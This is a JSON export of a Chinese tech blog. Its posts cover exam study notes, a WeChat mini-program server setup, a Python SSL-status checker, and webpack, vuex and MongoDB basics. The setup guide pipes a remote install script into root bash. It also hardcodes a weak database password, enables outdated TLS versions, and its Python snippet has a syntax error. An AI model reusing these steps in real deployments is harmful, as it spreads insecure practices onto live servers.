Zheng"},{"title":"软考易错题总结","slug":"软考易错题总结","date":"2018-05-23T12:43:13.000Z","updated":"2023-11-17T14:27:30.011Z","comments":true,"path":"2018/05/23/软考易错题总结/","link":"","permalink":"https://blog.zhengxiangling.com/2018/05/23/%E8%BD%AF%E8%80%83%E6%98%93%E9%94%99%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"对于软考中经常做错的题，做个总结。","text":"对于软考中经常做错的题，做个总结。 1、考查设计模式基础概念，需要搞清楚各个设计模式的特点与不同，设计模式共有结构型，创建型，行为型三大类，里面又各自包含了多种具体详细模式。具体内容如下： 例：创建型设计模式抽象了实例化过程，有助于系统开发者将对象的创建、组合和表示方式进行抽象。以下（48）模式是创建型模式。 A．组合(Composite) B．装饰器（Decorator） C．代理(Proxy) D．单例（Singleton） 【答案】D 2、考察软件测试的基础知识。 白盒测试的方法包括一系列的逻辑覆盖，主要的覆盖标准有语句覆盖、判定覆盖、条件覆盖、条件&#x2F;判定覆盖、条件组合覆盖、修正的条件&#x2F;判定覆盖和路径覆盖等。（1）语句覆盖。语句覆盖是指选择足够多的测试用例，使得运行这些测试用例时，被测程序的每个语句至少执行一次。很显然，语句覆盖是一种很弱的覆盖标准。 （2）判定覆盖。判定覆盖也称为分支覆盖，它是指不仅每个语句至少执行一次，而且每个判定的每种可能的结果（分支）都至少执行一次。判定覆盖比语句覆盖强，但对程序逻辑的覆盖程度仍然不高。 （3）条件覆盖。条件覆盖是指不仅每个语句至少执行一次，而且使判定表达式中的每个条件都取得各种可能的结果。条件覆盖不一定包含判定覆盖，判定覆盖也不一定包含条件覆盖。 （4）路径覆盖。路径覆盖是指选取足够的测试用例，使得程序的每条可能执行到的路径都至少经过一次（如果程序中有环路，则要求每条环路路径至少经过一次）。路径覆盖实际上考虑了程序中各种判定结果的所有可能组合，因此是一种较强的覆盖标准。但路径覆盖并未考虑判定中的条件结果的组合，并不能代替条件覆盖和条件组合覆盖。 3、数据字典是用来定义数据流图中各个成分的具体含义，它以一种准确的、无二义性的说明方法为系统的分析、设计及维护提供了有关元素一致的定义和详细的描述。数据库设计可以分为需求分析阶段、概念结构设计、逻辑结构设计和物理结构设计等阶段。 需求分析阶段：分析用户的需求，包括数据、功能和性能需求； 概念结构设计：在分析阶段，已经得到了系统的数据流程图和数据字典，现在要结合数据规范化的理论，用一种数据模型将用户的数据需求明确地表示出来。概念数据模型是面向问题的模型，反映了用户的现实工作环境，是与数据库的具体实现技术无关的。建立系统概念数据模型的过程叫做概念结构设计。 逻辑结构设计：根据已经建立的概念数据模型，以及所采用的某个数据库管理系统软件的数据模型特性，按照一定的转换规则，把概念模型转换为这个数据库管理系统所能够接受的逻辑数据模型。不同的数据库管理系统提供了不同的逻辑数据模型，如层次模型、网状模型、关系模型等。物理结构设计：为一个确定的逻辑数据模型选择一个最适合应用要求的物理结构的过程，就叫做数据库的物理结构设计。 数据库在物理设备上的存储结构和存取方法称为数据库的物理数据模型。 4、原子性：事务是原子的，要么做，要么都不做。 一致性：事务执行的结果必须保证数据库从一个一致性状态变到另一个一致性状态。隔离性：事务相互隔离。当多个事务并发执行时，任一事务的更新操作直到其成功提交的整个过程，对其它事物都是不可见的。 持久性：一旦事务成功提交，即使数据库崩溃，其对数据库的更新操作也永久有效。串行调度：多个事务依次串行执行，且只有当一个事务的所有操作都执行完后才执行另一个事务的所有操作。 可串行化保证了事务并行调度时，相互不破坏，同时保证了数据从一个一致性状态到另一个一致性状态。 5、UML2.0中提供了13种图形，一部分图给出了系统的动态视图，一部分图则给出系统的静态视图。 活动图展现了在系统内从一个活动到另一个活动的流程， 专注于系统的动态视图，它对于系统的功能建模特别重要，并强调对象间的控制流程，是状态图的一种特殊情况。通信图强调收发消息的对象之间的结构组织， 强调参加交互的对象的组织。 序列图是场景的图形化表示， 描述了以时间顺序组织的对象之间的交互活动， 对用例中的场景可以采用序列图进行描述。 定时图或时序图， 是UML2.0中新增的、特别适合实时和嵌入式系统建模的交互图，它关注沿着线性时间轴、生命线内部和生命线之间的条件改变，描述对象状态随着时间改变的情况，很像示波器，如下图所示，适合分析周期和非周期性任务。 类图展现了一组对象、 接口、 协作及其之间的关系， 属于静态视图；对象图展现了某一时刻一组对象以及它们之间的关系， 描述了在类图中所建立的事物的实例的静态快照；组件图／构件图展现了一组构件之间的组织和依赖， 专注于系统的静态实现视图， 它与类图相关， 通常把构件映射为一个或多个类、 接口或协作：包图是用于把模型本身组织成层次结构的通用机制， 不能执行， 展现由模型本身分解而成的组织单元以及其间的依赖关系。 6、从模块独立性角度看，以下几种模块内聚类型中，（50）内聚是最好的。 (50)A.巧合 B.逻辑 C.信息 D.功能 【答案】D 【解析】本题考查软件设计的基础知识。 模块化是指将软件划分成独立命名且可以独立访问的模块， 不同的模块通常具有不同的功能或职责。 每个模块可以独立地开发、 测试， 最后组装成完整的软件。 模块独立性是指软件系统中每个模块只涉及软件要求的具体的一个子功能，而和其他模块之间的接口尽量简单， 是模块化设计的一个重要原则， 主要用模块间的精合和模块内的内聚来衡量。 模块的内聚性一搬有以下几种：巧合内聚指一个模块内的几个处理元素之间没有任何联系。 逻辑内聚， 指模块内执行几个逻辑上相似的功能， 通过参数确定该模块完成哪一个功能。 时间内聚，把需要同时执行的动作组合在一起形成的模块。 通信内聚，指模块内所有处理元素都在同一个数据结构上操作，或者指各处理使用相同的输入数据或者产生相同的输出数据。 顺序内聚，指一个模块中各个处理元素都密切相关于同一功能且必须顺序执行，前一个功能元素的输出就是下一个功能元素的输入。 功能内聚， 是最强的内聚， 指模块内所有元素共同完成一个功能， 缺一不可。 是最佳的内聚类型。","categories":[],"tags":[],"author":"Elijah Zheng"},{"title":"搭建微信小程序服务","slug":"搭建微信小程序服务","date":"2018-04-11T11:52:00.000Z","updated":"2023-11-17T14:27:30.010Z","comments":true,"path":"2018/04/11/搭建微信小程序服务/","link":"","permalink":"https://blog.zhengxiangling.com/2018/04/11/%E6%90%AD%E5%BB%BA%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%9C%8D%E5%8A%A1/","excerpt":"手把手搭建微信小程序服务。","text":"手把手搭建微信小程序服务。 1.安装 NodeJS 和 NPM 12curl --silent --location https://rpm.nodesource.com/setup_8.x | sudo bash -yum install nodejs -y 安装完成后查看安装是否成功 1node -v 2.创建并进入文件夹 12$ mkdir -p /data/release/weapp$ cd /data/release/weapp 3.新建package.json 1234&#123; &quot;name&quot;: &quot;weapp&quot;, &quot;version&quot;: &quot;1.0.0&quot;&#125; 4.添加 express 服务 123456789101112131415161718// 引用 express 来支持 HTTP Server 的实现const express = require(&#x27;express&#x27;);// 创建一个 express 实例const app = express();// 实现唯一的一个中间件，对于所有请求，都输出 &quot;Response from express&quot;app.use((request, response, next) =&gt; &#123; response.write(&#x27;Response from express&#x27;); response.end();&#125;);// 监听端口，等待连接const port = 8765;app.listen(port);// 输出服务器启动日志console.log(`Server listening at http://127.0.0.1:$&#123;port&#125;`); 4.运行http1)安装 pm2 1npm install pm2 --global 2)安装 express 1npm install express --save 3)安装完成后，使用 PM2 来启动 HTTP 服务 1pm2 start app.js pm2 常用命令 要查看服务输出的日志，可以使用下面的命令： 1pm2 logs 如果要重启服务，可以使用下面的命令： 1pm2 restart app 5.安装 Nginx如果是 centOS，可以用 1yum install nginx -y 安装完成后启动nginx 1nginx 6.准备ssl证书，方法有很多种，现在有很多免费的ssl证书 7.ssl配置 12345678910111213141516server &#123; listen 443; server_name www.example.com; # 改为绑定证书的域名 # ssl 配置 ssl on; ssl_certificate 1_www.example.com_bundle.crt; # 改为自己申请得到的 crt 文件的名称 ssl_certificate_key 2_www.example.com.key; # 改为自己申请得到的 key 文件的名称 ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; ssl_prefer_server_ciphers on; location / &#123; proxy_pass http://127.0.0.1:8765; &#125; &#125; 8.安装 mongoDB以下是针对centOS的，其他方法之后补充。 1yum install mongodb-server mongodb -y 检查是否安装成功 12mongod --versionmongo --version 9.启动mongoDB1)创建目录，用于 MongoDB 数据和日志存储 12mkdir -p /data/mongodbmkdir -p /data/logs/mongodb 2)启动 1mongod --fork --dbpath /data/mongodb --logpath /data/logs/mongodb/weapp.log (MongoDB 首次启动可能会花费大概 1min 时间，请耐心等待) 3)检查是否启动成功 (MongoDB 默认监听 27017 端口等待连接，下面的命令查看当前 27017 端口被哪个进程占用，如果是 MongoDB 的进程，则表示启动成功。) 1netstat -ltp | grep 27017 10.添加 MongoDB 用户 1234$ mongo&gt; use weapp;&gt; db.createUser(&#123; user: &#x27;weapp&#x27;, pwd: &#x27;weapp-dev&#x27;, roles: [&#x27;dbAdmin&#x27;, &#x27;readWrite&#x27;]&#125;); mongo2.x 的时候用db.addUser() 创建完之后，exit 退出 11.安装 Node 模块实现小程序的会话功能，我们需要安装 connect-mongo 和 wafer-node-session 12cd /data/release/weappnpm install connect-mongo wafer-node-session 12.实现小程序会话 1)在工作目录weapp创建配置文件 config.js 123456789101112131415module.exports = &#123; serverPort: &#x27;8765&#x27;, // 小程序 appId 和 appSecret // 请到 https://mp.weixin.qq.com 获取 AppID 和 AppSecret appId: &#x27;YORU_APP_ID&#x27;, appSecret: &#x27;YOUR_APP_SECRET&#x27;, // mongodb 连接配置，生产环境请使用更复杂的用户名密码 mongoHost: &#x27;127.0.0.1&#x27;, mongoPort: &#x27;27017&#x27;, mongoUser: &#x27;weapp&#x27;, mongoPass: &#x27;weapp-dev&#x27;, mongoDb: &#x27;weapp&#x27;&#125;; 2)修改 app.js，添加会话实现逻辑 1234567891011121314151617181920212223242526272829303132333435363738394041// 引用 express 来支持 HTTP Server 的实现const express = require(&#x27;express&#x27;);// 引用 wafer-session 支持小程序会话const waferSession = require(&#x27;wafer-node-session&#x27;); // 使用 MongoDB 作为会话的存储const MongoStore = require(&#x27;connect-mongo&#x27;)(waferSession); // 引入配置文件const config = require(&#x27;./config&#x27;); // 创建一个 express 实例const app = express();// 添加会话中间件，登录地址是 /loginapp.use(waferSession(&#123; appId: config.appId, appSecret: config.appSecret, loginPath: &#x27;/login&#x27;, store: new MongoStore(&#123; url: `mongodb://$&#123;config.mongoUser&#125;:$&#123;config.mongoPass&#125;@$&#123;config.mongoHost&#125;:$&#123;config.mongoPort&#125;/$&#123;config.mongoDb&#125;` &#125;) &#125;)); // 在路由 /me 下，输出会话里包含的用户信息app.use(&#x27;/me&#x27;, (request, response, next) =&gt; &#123; response.json(request.session ? request.session.userInfo : &#123; noBody: true &#125;); if (request.session) &#123; console.log(`Wafer session success with openId=$&#123;request.session.userInfo.openId&#125;`); &#125;&#125;); // 实现一个中间件，对于未处理的请求，都输出 &quot;Response from express&quot;app.use((request, response, next) =&gt; &#123; response.write(&#x27;Response from express&#x27;); response.end();&#125;);// 监听端口，等待连接app.listen(config.serverPort);// 输出服务器启动日志console.log(`Server listening at http://127.0.0.1:$&#123;config.serverPort&#125;`); 3)重启 pm2 1pm2 restart app 13.WebSocket 服务1)安装 Node 模块 使用 ws 模块来在服务器上支持 WebSocket 协议，下面使用 NPM 来安装： 12cd /data/release/weappnpm install ws --save 2)创建 websocket.js，实现 WebSocket 服务，可参考下面的代码：websocket.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 引入 ws 支持 WebSocket 的实现const ws = require(&#x27;ws&#x27;);// 导出处理方法exports.listen = listen;/** * 在 HTTP Server 上处理 WebSocket 请求 * @param &#123;http.Server&#125; server * @param &#123;wafer.SessionMiddleware&#125; sessionMiddleware */function listen(server, sessionMiddleware) &#123; // 使用 HTTP Server 创建 WebSocket 服务，使用 path 参数指定需要升级为 WebSocket 的路径 const wss = new ws.Server(&#123; server, path: &#x27;/ws&#x27; &#125;); // 监听 WebSocket 连接建立 wss.on(&#x27;connection&#x27;, (ws,request) =&gt; &#123;// 要升级到 WebSocket 协议的 HTTP 连接 // 被升级到 WebSocket 的请求不会被 express 处理， // 需要使用会话中间节获取会话 sessionMiddleware(request, null, () =&gt; &#123; const session = request.session; if (!session) &#123; // 没有获取到会话，强制断开 WebSocket 连接 ws.send(JSON.stringify(request.sessionError) || &quot;No session avaliable&quot;); ws.close(); return; &#125; // 保留这个日志的输出可让实验室能检查到当前步骤是否完成 console.log(`WebSocket client connected with openId=$&#123;session.userInfo.openId&#125;`); serveMessage(ws, session.userInfo); &#125;); &#125;); // 监听 WebSocket 服务的错误 wss.on(&#x27;error&#x27;, (err) =&gt; &#123; console.log(err); &#125;);&#125;/** * 进行简单的 WebSocket 服务，对于客户端发来的所有消息都回复回去 */function serveMessage(ws, userInfo) &#123; // 监听客户端发来的消息 ws.on(&#x27;message&#x27;, (message) =&gt; &#123; console.log(`WebSocket received: $&#123;message&#125;`); ws.send(`Server: Received($&#123;message&#125;)`); &#125;); // 监听关闭事件 ws.on(&#x27;close&#x27;, (code, message) =&gt; &#123; console.log(`WebSocket client closed (code: $&#123;code&#125;, message: $&#123;message || &#x27;none&#x27;&#125;)`); &#125;); // 连接后马上发送 hello 消息给会话对应的用户 ws.send(`Server: 恭喜，$&#123;userInfo.nickName&#125;`);&#125; 修改 app.js ,调用 WebSocket 服务，可参考下面代码: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// HTTP 模块同时支持 Express 和 WebSocketconst http = require(&#x27;http&#x27;); // 引用 express 来支持 HTTP Server 的实现const express = require(&#x27;express&#x27;);// 引用 wafer-session 支持小程序会话const waferSession = require(&#x27;wafer-node-session&#x27;); // 使用 MongoDB 作为会话的存储const MongoStore = require(&#x27;connect-mongo&#x27;)(waferSession); // 引入配置文件const config = require(&#x27;./config&#x27;); // 引入 WebSocket 服务实现const websocket = require(&#x27;./websocket&#x27;);// 创建一个 express 实例const app = express();// 独立出会话中间件给 express 和 ws 使用const sessionMiddleware = waferSession(&#123; appId: config.appId, appSecret: config.appSecret, loginPath: &#x27;/login&#x27;, store: new MongoStore(&#123; url: `mongodb://$&#123;config.mongoUser&#125;:$&#123;config.mongoPass&#125;@$&#123;config.mongoHost&#125;:$&#123;config.mongoPort&#125;/$&#123;config.mongoDb&#125;` &#125;)&#125;);app.use(sessionMiddleware);// 在路由 /me 下，输出会话里包含的用户信息app.use(&#x27;/me&#x27;, (request, response, next) =&gt; &#123; response.json(request.session ? request.session.userInfo : &#123; noBody: true &#125;); if (request.session) &#123; console.log(`Wafer session success with openId=$&#123;request.session.userInfo.openId&#125;`); &#125;&#125;); // 实现一个中间件，对于未处理的请求，都输出 &quot;Response from express&quot;app.use((request, response, next) =&gt; &#123; response.write(&#x27;Response from express&#x27;); response.end();&#125;);// 创建 HTTP Server 而不是直接使用 express 监听const server = http.createServer(app);// 让 WebSocket 服务在创建的 HTTP 服务器上监听websocket.listen(server, sessionMiddleware);// 启动 HTTP 服务server.listen(config.serverPort);// 输出服务器启动日志console.log(`Server listening at http://127.0.0.1:$&#123;config.serverPort&#125;`); 修改完成后，按 Ctrl + S 保存文件，并重启服务： 1pm2 restart app 3)更新 Nginx 代理 1234567891011121314151617181920212223242526# WebSocket 配置map $http_upgrade $connection_upgrade &#123; default upgrade; &#x27;&#x27; close;&#125;server &#123; listen 443; server_name www.example.com; # 改为绑定证书的域名 # ssl 配置 ssl on; ssl_certificate 1_www.example.com.crt; # 改为自己申请得到的 crt 文件的名称 ssl_certificate_key 2_www.example.com.key; # 改为自己申请得到的 key 文件的名称 ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; ssl_prefer_server_ciphers on; # WebSocket 配置 proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; location / &#123; proxy_pass http://127.0.0.1:8765; &#125; &#125; 修改完成后重启nginx:&#96;&#96; bashnginx -s reload&#96;&#96;&#96;","categories":[],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://blog.zhengxiangling.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"author":"Elijah Zheng"},{"title":"网站服务状态及ssl证书状态在线检测工具","slug":"网站服务状态及ssl证书状态在线检测工具","date":"2018-03-17T07:19:00.000Z","updated":"2023-11-17T14:27:30.011Z","comments":true,"path":"2018/03/17/网站服务状态及ssl证书状态在线检测工具/","link":"","permalink":"https://blog.zhengxiangling.com/2018/03/17/%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E7%8A%B6%E6%80%81%E5%8F%8Assl%E8%AF%81%E4%B9%A6%E7%8A%B6%E6%80%81%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/","excerpt":"为了检测多个网站及检测网站ssl证书有效性，写了一个在线测试检测工具。","text":"为了检测多个网站及检测网站ssl证书有效性，写了一个在线测试检测工具。 实现功能自由添加和编辑站点信息 单选及多选检测 支持http和https检测 当有ssl证书时，检测证书的有效状态以及过期时间 查看检测历史 环境python3 node-8.9.1 框架及数据库后端：tornado 前端：vue 数据库：mongo http检测状态实现原理通过 python requests 库 123456789101112131415import requeststry: web_url = &#x27;http://...&#x27; # timeout - 请求超时时间 r = requests.get(web_url, timeout=10) print(&#x27;请求成功&#x27;) ... return True;except Exception as e: # 输出错误原因 print(e) return False; https 检测状态及ssl证书状态测试实现原理运用 socket 库建立连接，ssl库获取ssl证书的公钥，在通过openssl的crypto通过公钥解密获取ssl证书里的信息。 12345678910111213141516171819202122232425262728293031323334import sslimport socketfrom OpenSSL import cryptoweb_url = &#x27;https://...&#x27;# ssl.PROTOCOL_TLS - ssl支持协议context = ssl.SSLContext(ssl.PROTOCOL_TLS)# 建立 socket 连接 # socket.AF_INET 为 IPv4 网络协议的套接字类型sock = socket.socket(socket.AF_INET)# 设置超时时间 10ssock.settimeout(10)wrappedSocket = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=web_urltry: wrappedSocket.connect(web_url, 443)) # 获取 ssl 证书公钥 pem_cert = ssl.DER_cert_to_PEM_cert(wrappedSocket.getpeercert(True)) wrappedSocket.close() # 解密公钥 io_cert = crypto.load_certificate(crypto.FILETYPE_PEM, pem_cert) # 证书过期时间 ssl_time = io_cert.get_notAfter().decode()[:-1] ssl_not_after = ssl_time[0:4] + &#x27;年&#x27; + ssl_time[4:6] + &#x27;月&#x27; + ssl_time[6:8] + &#x27;日&#x27; + ssl_time[8:10] + &#x27;时&#x27; + ssl_time[10:12] + &#x27;分&#x27; + ssl_time[12:14] + &#x27;秒&#x27; # 证书有效状态 ssl_expired = io_cert.has_expired() return True;except Exception as e: # 连接失败，输出错误原因 print(e) return False; 遇到问题1.webpack打包时遇到 1You are using the runtime-only build of Vue where the template compiler is not available. Either pre-compile the templates into render functions, or use the compiler-included build. 解决办法，在webpack配置中增加 12345resolve: &#123; alias: &#123; vue: &#x27;vue/dist/vue.js&#x27;, &#125;&#125; 资料 ssl — TLS&#x2F;SSL wrapper for socket objects - https://docs.python.org/3.2/library/ssl.html#ssl.SSLSocket.getpeercert","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://blog.zhengxiangling.com/tags/python/"},{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"},{"name":"webpack","slug":"webpack","permalink":"https://blog.zhengxiangling.com/tags/webpack/"},{"name":"tornado","slug":"tornado","permalink":"https://blog.zhengxiangling.com/tags/tornado/"},{"name":"ssl","slug":"ssl","permalink":"https://blog.zhengxiangling.com/tags/ssl/"},{"name":"mongo","slug":"mongo","permalink":"https://blog.zhengxiangling.com/tags/mongo/"}],"author":"Elijah Zheng"},{"title":"学习 webpack","slug":"ѧϰ-webpack","date":"2018-03-11T04:18:00.000Z","updated":"2023-11-17T14:27:30.008Z","comments":true,"path":"2018/03/11/ѧϰ-webpack/","link":"","permalink":"https://blog.zhengxiangling.com/2018/03/11/%D1%A7%CF%B0-webpack/","excerpt":"","text":"learn-webpack学习webpack 环境node 8.9.1npm 5.7.1webpack 4 script开发模式 - npm run dev打包 - npm run build运行打包后的文件 - npm run server 实现 多入口 html - 配置入口 config/entry.json base64 处理limit限制以下的图片 css预处理 dev模式下热重载 babel-loader 转es5 image-webpack-loader 压缩图片 SplitChunksPlugin 提取公共js postcss-loader 自动增加css3前缀 html-withimg-loader 增加html识别图片路径 分类css img js 到不同的文件夹中 github传送门","categories":[],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://blog.zhengxiangling.com/tags/webpack/"}],"author":"Elijah Zheng"},{"title":"学习 webpack","slug":"学习-webpack","date":"2018-03-11T04:18:00.000Z","updated":"2023-11-17T14:27:30.010Z","comments":true,"path":"2018/03/11/学习-webpack/","link":"","permalink":"https://blog.zhengxiangling.com/2018/03/11/%E5%AD%A6%E4%B9%A0-webpack/","excerpt":"","text":"learn-webpack学习webpack 环境node 8.9.1npm 5.7.1webpack 4 script开发模式 - npm run dev打包 - npm run build运行打包后的文件 - npm run server 实现 多入口 html - 配置入口 config/entry.json base64 处理limit限制以下的图片 css预处理 dev模式下热重载 babel-loader 转es5 image-webpack-loader 压缩图片 SplitChunksPlugin 提取公共js postcss-loader 自动增加css3前缀 html-withimg-loader 增加html识别图片路径 分类css img js 到不同的文件夹中 github传送门","categories":[],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://blog.zhengxiangling.com/tags/webpack/"}],"author":"Elijah Zheng"},{"title":"Django 实现登录，注册，用 Pillow 添加验证码","slug":"django-实现登录，注册，用-Pillow-添加验证码","date":"2018-02-13T06:52:00.000Z","updated":"2023-11-17T14:27:30.004Z","comments":true,"path":"2018/02/13/django-实现登录，注册，用-Pillow-添加验证码/","link":"","permalink":"https://blog.zhengxiangling.com/2018/02/13/django-%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95%EF%BC%8C%E6%B3%A8%E5%86%8C%EF%BC%8C%E7%94%A8-Pillow-%E6%B7%BB%E5%8A%A0%E9%AA%8C%E8%AF%81%E7%A0%81/","excerpt":"","text":"用 Django 作为后端，Django 有自己的一套登录和注册方式（User Model），可以对 User Model 进行扩展，新作一张表 user_ext 。 然后用 Pillow 生成验证码，防止刷用户注册。 github 传送门","categories":[],"tags":[{"name":"django","slug":"django","permalink":"https://blog.zhengxiangling.com/tags/django/"},{"name":"pillow","slug":"pillow","permalink":"https://blog.zhengxiangling.com/tags/pillow/"}],"author":"Elijah Zheng"},{"title":"学习 vuex","slug":"ѧϰ-vuex","date":"2018-02-13T06:43:00.000Z","updated":"2023-11-17T14:27:30.008Z","comments":true,"path":"2018/02/13/ѧϰ-vuex/","link":"","permalink":"https://blog.zhengxiangling.com/2018/02/13/%D1%A7%CF%B0-vuex/","excerpt":"","text":"vuex 可以用来帮助我们管理全局的状态，以音乐播放器来举例。我们在播放音乐的时候，需要将音乐的信息保存到全局变量中，然后当点击其他页面的时候，音乐的信息保存有，就可以在其他页面自由切换，不至于点到其他页面的时候之前播放的音乐的信息就没有了。当想调用音乐信息的时候，从全局变量中调出即可。 github 传送门","categories":[],"tags":[{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"},{"name":"vuex","slug":"vuex","permalink":"https://blog.zhengxiangling.com/tags/vuex/"}],"author":"Elijah Zheng"},{"title":"学习 vuex","slug":"学习-vuex","date":"2018-02-13T06:43:00.000Z","updated":"2023-11-17T14:27:30.010Z","comments":true,"path":"2018/02/13/学习-vuex/","link":"","permalink":"https://blog.zhengxiangling.com/2018/02/13/%E5%AD%A6%E4%B9%A0-vuex/","excerpt":"","text":"vuex 可以用来帮助我们管理全局的状态，以音乐播放器来举例。我们在播放音乐的时候，需要将音乐的信息保存到全局变量中，然后当点击其他页面的时候，音乐的信息保存有，就可以在其他页面自由切换，不至于点到其他页面的时候之前播放的音乐的信息就没有了。当想调用音乐信息的时候，从全局变量中调出即可。 github 传送门","categories":[],"tags":[{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"},{"name":"vuex","slug":"vuex","permalink":"https://blog.zhengxiangling.com/tags/vuex/"}],"author":"Elijah Zheng"},{"title":"MongoDB 学习","slug":"MongoDB-ѧϰ","date":"2018-01-29T06:59:00.000Z","updated":"2023-11-17T14:27:30.003Z","comments":true,"path":"2018/01/29/MongoDB-ѧϰ/","link":"","permalink":"https://blog.zhengxiangling.com/2018/01/29/MongoDB-%D1%A7%CF%B0/","excerpt":"1.进入数据库 1$ mongo 不进行任何操作的时候，默认使用的数据库为test 2.创建或切换数据库 12&gt; use learndbswitched to db learndb","text":"1.进入数据库 1$ mongo 不进行任何操作的时候，默认使用的数据库为test 2.创建或切换数据库 12&gt; use learndbswitched to db learndb 3.查看存在的数据库（只显示有数据的数据库） 12345&gt; show databases or&gt; show dbsadmin 0.000GBconfig 0.000GB 当向数据库learndb中插入数据时，show dbs才会显示learndb。 4.查看当前使用的数据库 12&gt; dblearndb 5.删除当前的数据库 12db.dropDatabase()&#123; &quot;ok&quot; : 1 &#125; 6.创建数据库集合 12&gt; db.createCollection(&#x27;myCol&#x27;)&#123; &quot;ok&quot; : 1 &#125; 创建时可以带参数options options参数是可选的，因此只需要指定集合的名称。 以下是可以使用的选项列表： 字段 类型 描述 capped Boolean (可选)如果为true，则启用封闭的集合。上限集合是固定大小的集合，它在达到其最大大小时自动覆盖其最旧的条目。 如果指定true，则还需要指定size参数。 autoIndexId Boolean (可选)如果为true，则在_id字段上自动创建索引。默认值为false。 size 数字 (可选)指定上限集合的最大大小(以字节为单位)。 如果capped为true，那么还需要指定此字段的值。 max 数字 (可选)指定上限集合中允许的最大文档数。 例如： 12345&gt; db.createCollection(&quot;myCol2&quot;, &#123;capped : true, autoIndexId : true, size : 6142800, max : 10000 &#125;)&#123; &quot;note&quot; : &quot;the autoIndexId option is deprecated and will be removed in a future release&quot;, &quot;ok&quot; : 1&#125; 7.查看创建的集合 123&gt; show collectionsmyColmyCol2 8.删除指定的集合 db.collection.drop() 12&gt; db.myCol2.drop()true 9.插入文档 db.collection.insert(&#123;&#125;) 123456&gt; db.myCol.insert(&#123; title: &#x27;learn mongodb&#x27;, url: &#x27;https://blog.zhengxiangling.com&#x27;, view: &#x27;99&#x27;&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;) 其他插入方法 db.post.save(document) db.collection.insertOne() db.collection.insertMany() 10.查询集合 db.collection.find() 12&gt; db.myCol.find()&#123; &quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;), &quot;title&quot; : &quot;learn mongodb&quot;, &quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;, &quot;view&quot; : &quot;99&quot; &#125; 结合preey()方法，格式化输出 1234567&gt; db.myCol.find().pretty()&#123; &quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;), &quot;title&quot; : &quot;learn mongodb&quot;, &quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;, &quot;view&quot; : &quot;99&quot;&#125; 加参数的查找 操作 语法 示例 RDBMS等效语句 相等 &#123;&lt;key&gt;:&lt;value&gt;&#125; db.mycol.find(&#123;&quot;by&quot;:&quot;yiibai&quot;&#125;).pretty() where by = &#39;yiibai&#39; 小于 &#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$lt:50&#125;&#125;).pretty() where likes &lt; 50 小于等于 &#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$lte:50&#125;&#125;).pretty() where likes &lt;= 50 大于 &#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$gt:50&#125;&#125;).pretty() where likes &gt; 50 大于等于 &#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$gte:50&#125;&#125;).pretty() where likes &gt;= 50 不等于 &#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$ne:50&#125;&#125;).pretty() where likes != 50 结合and或者or查找 123456789101112131415&gt;db.mycol.find( &#123; $and: [ &#123;key1: value1&#125;, &#123;key2:value2&#125; ] &#125;).pretty()&gt;db.mycol.find( &#123; $or: [ &#123;key1: value1&#125;, &#123;key2:value2&#125; ] &#125;).pretty() 设置查找到的文档要显示出的字段，如只显示_id和title，1表示显示 1db.mycol.find(&#123;&#125;, &#123;&#x27;_id&#x27;:1, &#x27;title&#x27;:1&#125;) 11.更新文档 update 12&gt; db.myCol.update(&#123;title: &#x27;learn mongodb&#x27;&#125;, &#123;$set: &#123;title: &#x27;update title&#x27;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;) 默认只会修改匹配到的第一个文档，若要修改所有匹配到的文档，将参数multi设置为true 1&gt; db.myCol.update(&#123;title: &#x27;learn mongodb&#x27;&#125;, &#123;$set: &#123;title: &#x27;update title&#x27;&#125;, &#123;multi: true&#125;&#125;) 12.删除文档 remove 删除匹配到的所有文档 1db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;) 如果想只删除匹配到的第一条文档，加参数1 1db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;, 1) 把集合下的所有文档都删除 1db.myCol.remove() 13.限制记录数 limit(),skip() 比如查询到的记录有10条，只想要前5条，可以用limit() 1db.myCol.find().limit(5) 比如查询出的数据，不想要前3条，可以调过前三条的文档，可以用skip() 1db.myCol.find().skip(3) 14.排序记录 